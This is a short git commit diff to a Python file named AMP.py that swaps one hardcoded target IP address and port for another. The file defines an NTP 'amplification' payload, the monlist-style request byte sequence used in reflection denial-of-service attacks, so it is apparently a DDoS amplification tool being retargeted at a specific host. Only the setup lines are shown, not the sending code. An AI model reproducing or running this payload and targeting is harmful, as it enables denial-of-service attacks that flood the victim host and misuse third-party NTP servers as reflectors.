3327fdc51ce9d140d466fda04799dc711b45089b
zJonchx <jonathaneliaschavez123@gmail.com>
2025-06-16 21:48:33 -0300

    Update AMP.py

--- AMP.py
+++ AMP.py
@@ -1,7 +1,7 @@
 import socket
 
-target_ip = "147.185.221.16"
-target_port = 26544  # Cambia al puerto que desees
+target_ip = "65.108.224.31"
+target_port = 19187  # Cambia al puerto que desees
 
 # Ejemplo de payloads de amplificación
 ntp_payload = b'\x17\x00\x03\x2a' + b'\x00' * 4
